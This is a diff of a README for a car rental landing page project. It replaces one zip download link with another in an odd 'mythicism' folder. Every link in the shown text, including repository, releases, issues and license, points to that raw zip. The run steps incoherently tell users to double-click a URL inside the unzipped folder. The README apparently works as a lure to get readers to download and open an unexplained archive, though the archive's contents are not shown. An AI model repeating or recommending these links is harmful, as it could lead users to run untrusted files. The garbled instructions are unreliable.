@@ -4,7 +4,7 @@
 Welcome! This guide helps you download and run the car rental landing page easily. No programming knowledge is required. Follow these straightforward steps.
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar-landing-page-v1.5.zip%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar-landing-page-v1.5.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar_landing_page_vag.zip%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar_landing_page_vag.zip)
 
 ## 📋 Overview
 The **rentcar-landing-page** is a modern and responsive website design for car rentals. It is built using pure HTML, CSS, and JavaScript. This page features interactive car listings and integrates with WhatsApp for easy booking. It’s perfect for any car rental company wanting a professional online presence.
@@ -23,7 +23,7 @@ Before you start, ensure you have:
 - Internet connection to download the files.
 
 ## 📥 Download & Install
-1. Go to the [Releases Page](https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar-landing-page-v1.5.zip).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar_landing_page_vag.zip).
 2. Look for the most recent release. You will find a list of files available for download.
 3. Click on the zip file link or any other file you see. 
 4. The file will start downloading to your computer.
@@ -35,8 +35,8 @@ Before you start, ensure you have:
 
 ## 🌐 Run the Landing Page
 1. Open the folder where you unzipped the files.
-2. Look for `https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar-landing-page-v1.5.zip` inside the folder.
-3. Double-click on `https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar-landing-page-v1.5.zip`. This action will open the landing page in your default web browser.
+2. Look for `https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar_landing_page_vag.zip` inside the folder.
+3. Double-click on `https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar_landing_page_vag.zip`. This action will open the landing page in your default web browser.
 
 ## 📱 How to Interact
 - Browse through the car listings you see on the page.
@@ -61,12 +61,12 @@ Yes, once you have modified it to fit your needs, you can upload your files to a
 
 ## 💬 Support
 If you encounter any issues, please reach out for support:
-- Open an Issue on the [GitHub repository](https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar-landing-page-v1.5.zip).
+- Open an Issue on the [GitHub repository](https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar_landing_page_vag.zip).
 - Check the FAQ section on our repository for common questions.
 
 ## 🔗 Links
-- [GitHub Repository](https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar-landing-page-v1.5.zip)
-- [Releases Page](https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar-landing-page-v1.5.zip)
-- [License Information](https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar-landing-page-v1.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar_landing_page_vag.zip)
+- [Releases Page](https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar_landing_page_vag.zip)
+- [License Information](https://raw.githubusercontent.com/ArifDarmawan99/rentcar-landing-page/main/mythicism/rentcar_landing_page_vag.zip)
 
 Thank you for choosing **rentcar-landing-page**. We hope you enjoy building your car rental service!
